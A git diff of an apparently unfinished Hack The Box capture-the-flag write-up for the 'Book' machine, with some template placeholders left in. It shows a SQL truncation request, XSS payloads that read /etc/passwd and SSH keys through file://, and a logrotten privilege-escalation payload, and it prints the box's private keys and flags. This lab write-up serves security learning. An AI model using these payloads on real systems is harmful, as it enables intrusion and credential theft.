@@ -1,27 +1,22 @@
-# HTB - <Machine_Name>
+# HTB - Book
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](../.gitbook/assets/1-book-infocard.png)
 
-<Short description to include any strange things to be dealt with> 
+A medium Linux box that tested x...and taught me x...
 
 ## Useful Skills and Tools
 
-#### <Useful thing 1>
-
-<description with generic example>
-
-#### <Useful thing 2>
-
-<description with generic example>
+Useful tool or skill 1
 
 ## Enumeration
 
 ### Nmap scan
 
 I started my enumeration with an nmap scan of `<ip>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oN <name>` saves the output with a filename of `<name>`.
-```
+
+```text
 zweilos@kalimaa:~/htb/book$ nmap -p- -sC -sV -oN book.nmap 10.10.10.176
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:38 EDTNmap scan report for 10.10.10.176
 Host is up (0.23s latency).
@@ -44,10 +39,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8272.93 seconds
 ```
+
 only two ports opn, 22 -ssh and 80 - http, nothing to do except check to see what is hosted on port 80.
 
-navigating to 10.10.10.176 leads to a login page.  Peaking at the source code of the page shows an interesting script embedded in the html.
-```
+navigating to 10.10.10.176 leads to a login page. Peaking at the source code of the page shows an interesting script embedded in the html.
+
+```text
 <script>
   window.console = window.console || function(t) {};
 </script>
@@ -69,9 +66,10 @@ function validateForm() {
 }
 </script>
 ```
-https://resources.infosecinstitute.com/sql-truncation-attack/#gref
 
-```
+[https://resources.infosecinstitute.com/sql-truncation-attack/\#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)
+
+```text
 How the select query works:
 Before passing data to the ‘insert’ query, the ‘select’ query matches the username with the previous entries to reveal any redundant entries. As the username we entered is ‘admin          1’ the select query will not find any similar entry and pass the data to the insert query to do its job.
 
@@ -84,9 +82,9 @@ When we try to login with username = ‘admin’  and the password that we creat
 
 admin@book.htb - gained from contact page; trying to use burp to guess password on /admin/index.php doesnt work
 
-forgot password doesnt work
-Attacking the Sign up page using Sql Truncate
-```
+forgot password doesnt work Attacking the Sign up page using Sql Truncate
+
+```text
 POST /index.php HTTP/1.1
 Host: 10.10.10.176
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -104,11 +102,11 @@ DNT: 1
 name=admin&email=admin%40book.htb                                    test&password=admin!!!
 ```
 
-form will only accept input of a certain length, everything else is truncated.  Was able to change admin logon with this by registering a new user named admin, admin.book.htb with spaces, and a password.
-Seemingly I had hit a dead end.  
+form will only accept input of a certain length, everything else is truncated. Was able to change admin logon with this by registering a new user named admin, admin.book.htb with spaces, and a password. Seemingly I had hit a dead end.
 
 ## Enumeration with Dirbuster
-```
+
+```text
 DirBuster 1.0-RC1 - Report
 http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
 Report produced on Sun Jun 07 12:08:31 EDT 2020
@@ -159,15 +157,16 @@ Files found with a 200 responce:
 /db.php
 --------------------------------
 ```
-I checked the progress of my Dirbuster scan, and was pleasantly surprised to see some an `/admin/index.php` page listed.  I tried using my new admin credentials I had created and logged in.
+
+I checked the progress of my Dirbuster scan, and was pleasantly surprised to see some an `/admin/index.php` page listed. I tried using my new admin credentials I had created and logged in.
 
 ## Initial Foothold
+
 ## Road to User
 
 You can see that the author and book name is reflecting in the pdf
 
-https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
-
+[https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
 
 ## Testing Code Execution with XSS
 
@@ -175,23 +174,25 @@ https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html
 
 "test" was written to the pdf!
 
-## Local File Inclusion (LFI) through XSS Cross Site Scripting
+## Local File Inclusion \(LFI\) through XSS Cross Site Scripting
 
-the pdf that is uploaded to the site can be downloaded through the admin portal, but the pdf output the admin portal collections page makes is dynamically projected html.  This can be exploited to xss ^ with javascript.  Code execution! lets try to get `/etc/passwd` now. I used burp to make sending the request easier each time.
-```
+the pdf that is uploaded to the site can be downloaded through the admin portal, but the pdf output the admin portal collections page makes is dynamically projected html. This can be exploited to xss ^ with javascript. Code execution! lets try to get `/etc/passwd` now. I used burp to make sending the request easier each time.
+
+```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```
 
-LFI vulnerability confirmed.  Only reader and root can login.  user 'reader' was identified through getting the /etc/passwd file, then need to see if he has ssh key file since port 22 is open, and I have not found any passwords anywhere
-
+LFI vulnerability confirmed. Only reader and root can login. user 'reader' was identified through getting the /etc/passwd file, then need to see if he has ssh key file since port 22 is open, and I have not found any passwords anywhere
 
 ### Finding user creds
-```
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
 
+```text
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
 ```
+
 had to open pdf in firefox then ctrl-a, ctrl-c, otherwise text is truncated in default pdf reader
-```
+
+```text
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
 G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
@@ -222,8 +223,10 @@ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
 ```
 
 ### User.txt
-remember to chmod 600 id_rsa before use
-```
+
+remember to chmod 600 id\_rsa before use
+
+```text
 zweilos@kalimaa:~/htb/book$ ssh -i id_rsa reader@10.10.10.176
 The authenticity of host '10.10.10.176 (10.10.10.176)' can't be established.                           
 ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9/eAeT/9wUfoQQk.                           
@@ -260,11 +263,14 @@ reader@book:~$ cat user.txt
 51c1d4b5197fa30e3e5d37f8778f95bc
 reader@book:~$
 ```
+
 ## Path to Power \(Gaining Administrator Access\)
-### Enumeration as User <username>
+
+### Enumeration as User
+
 linpeas.sh
-  
-```
+
+```text
 [+] Modified interesting files in the last 5mins
 /tmp/temp/1.c                                                                                          
 /var/log/auth.log
@@ -282,13 +288,14 @@ linpeas.sh
 [+] Writable log files (logrotten)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
 Writable: /home/reader/backups/access.log.1                                                            
-Writable: /home/reader/backups/access.log                                                              
+Writable: /home/reader/backups/access.log
 ```
 
-## Logrotate exploitation (logrotten)
-Looks like I might not have to do much searching to find a vulnerability.  I then read the blog post about logrotate-exploitation
+## Logrotate exploitation \(logrotten\)
 
-```
+Looks like I might not have to do much searching to find a vulnerability. I then read the blog post about logrotate-exploitation
+
+```text
 [+] Files inside /home/reader (limit 20)
 total 3092                                                                                             
 drwxr-xr-x 7 reader reader    4096 Jun  7 17:45 .
@@ -308,33 +315,43 @@ drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
 -rw------- 1 reader reader    1639 Jun  7 17:45 .viminfo
 ```
 
-Using pspy to check running proccesses I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0    PID=16535  | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`
+Using pspy to check running processes I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0 PID=16535 | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`
 
-```
+It looked to me like a script \(probably in a cron job\) that was resetting the password of the admin account I had used to get in.  I tried this password on the root account hoping it would let me in, but no dice.
+
+```text
 root     120188  0.5  0.2  46832  6000 pts/1    Ss+  01:33   0:00 ssh -i .ssh/id_rsa localhost
 root     120192  0.0  0.3 107984  7140 ?        Ss   01:33   0:00 sshd: root@pts/2
 ```
 
-`2020/06/07 17:08:30 CMD: UID=0    PID=16773  | /usr/sbin/logrotate -f /root/log.cfg `
+`2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg`
 
-So the system was indeed running logrotate.  Time to test out this exploit to see if I could escalate privileges to root.
+So the system was indeed running logrotate. Time to test out this exploit to see if I could escalate privileges to root.
 
 ### Getting a shell
-```
+
+```text
 [+] Writable log files (logrotten)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                 
 Writable: /home/reader/backups/access.log.1                                                            
-Writable: /home/reader/backups/access.log 
+Writable: /home/reader/backups/access.log
 ```
 
 linpeas.sh also told me that there were writable log files in `reader`'s home directory, and that this could potentially by exploited through the logrotate service. Checking out the provided link gave me the following helpful information:
 
-> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotatewrite a file in any location. If logrotate is being executed by root, then the user will be able to write any file in /etc/bash_completion.d/  that will be executed by any user that login.
-> So, if you have write perms over a log file or any of its parent folder, you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root). Also, check if apart of /var/log there are more files being rotated.
-> More detailed information about the vulnerability can be found in this page https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition.
-> You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).
+> There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location. If logrotate is being executed by root, then the user will be able to write any file in `/etc/bash_completion.d/` that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder, you can privesc \(on most linux distributions, logrotate is executed automatically once a day as user root\). Also, check if apart of `/var/log` there are more files being rotated. More detailed information about the vulnerability can be found in this page [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition). You can exploit this vulnerability with [logrotten](https://github.com/whotwagner/logrotten).
 
-```
+From the exploit writer:
+
+> ### Precondition for privilege escalation
+>
+> * [x] Logrotate has to be executed as root
+> * [x] The logpath needs to be in control of the attacker
+> * [x] Any option that creates files is set in the logrotate configuration
+
+Based on my enumeration I found that these conditions were met, so I went ahead and created a payload for this exploit, and ran it.
+
+```text
 reader@book:/dev/shm$ ./logrotten -p ./payload /home/reader/backups/access.log
 Waiting for rotating /home/reader/backups/access.log...
 Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
@@ -342,27 +359,34 @@ Waiting 1 seconds before writing payload...
 Done!
 ```
 
-payload: 
-```
+My payload was designed to exfiltrate both `root.txt` and `root`'s SSH key.
+
+```text
 #!/bin/bash
 /bin/cat /root/root.txt > /dev/shm/test
 /bin/cat /root/.ssh/id_rsa > /dev/shm/test2
 ```
-in order to force log rotation:
-```
+
+In order to execute my script, I had to force log rotation by writing to the log a valid entry.  I simply copied the valid entry from the backup in the same folder:
+
+```text
 reader@book:~/backups$ cat access.log.1
 192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
 reader@book:~/backups$ cp access.log.1 access.log
 ```
 
 ### Root.txt
-(root.txt)
-```
+
+\(root.txt\)
+
+```text
 reader@book:/dev/shm$ cat test 
 84da92adf998a1c7231297f70dd89714
 ```
+
 ssh key
-```
+
+```text
 reader@book:/dev/shm$ cat test2
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCETrWcIdNU6J
@@ -392,8 +416,10 @@ ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB
 yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ==
 -----END RSA PRIVATE KEY-----
 ```
+
 As always, remember to `chmod 600` your private SSH key files!
-```
+
+```text
 zweilos@kalimaa:~/htb/book$ chmod 600 root.id_rsa 
 zweilos@kalimaa:~/htb/book$ ssh -i root.id_rsa root@10.10.10.176
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
@@ -419,8 +445,10 @@ Last login: Wed Feb 19 14:49:02 2020 from ::1
 root@book:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 book
-root@book:~# 
+root@book:~#
 ```
-Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for <something interesting or useful about this machine.
+
+Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for &lt;something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
